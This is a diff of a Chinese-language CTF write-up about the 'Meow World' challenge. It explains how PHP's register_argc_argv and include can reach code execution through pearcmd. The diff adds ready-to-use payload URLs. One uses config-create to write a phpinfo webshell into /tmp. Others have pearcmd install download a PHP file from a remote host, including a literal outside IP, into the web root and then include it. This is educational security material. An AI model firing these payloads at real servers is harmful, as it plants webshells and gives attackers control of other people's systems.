@@ -1,12 +1,12 @@
 ---
-title: register_argc_argv与include限制php任意文件下载的小结
+title: register_argc_argv与include to RCE的巧妙组合
 tags:
   - php
   - 文件包含
   - php配置
 ---
 
-# register_argc_argv与include限制php任意文件下载的小结
+# register_argc_argv与include to RCE的巧妙组合
 引子是巅峰极客2020的**Meow World**,题目总结下来只有一句话:
 
  ```php
@@ -206,7 +206,6 @@ main/php_variables.c
 
 ![](https://gitee.com/guuest/images/raw/master/img/20210605082954.png)
 
-
 ## 回到题目
 
 现在回到题目,我们所有的拼图已经凑齐了,假如存在以下环境:
@@ -220,6 +219,10 @@ main/php_variables.c
 那么我们就可以通过上面的知识实现任意文件下载从而getshell:
 
  ```
+ //通过本地直接写入webshell,注意这里最好抓包然后用burpsuite或者直接curl执行，否则浏览器会将< ? > 转义
+ // config-create可以直接创建配置文件，且第一个参数必须以/开头
+ http://ip:port/include.php?f=pearcmd&+config-create+/<?=phpinfo();?>+/tmp/evil.php
+ // 通过远程直接下载webshell
  // web目录可写
  - http://ip:port/include.php?f=pearcmd&+install+-R+/var/www/html+http://ip:port/evil.php
  - http://ip:port/tmp/pear/download/evil.php
@@ -228,6 +231,8 @@ main/php_variables.c
  - http://ip:port/include.php?f=/tmp/pear/download/evil
  ```
 
+
+&+install+-R+/tmp+http://162.14.65.110:8888/1.php
 
 ## 后门
 
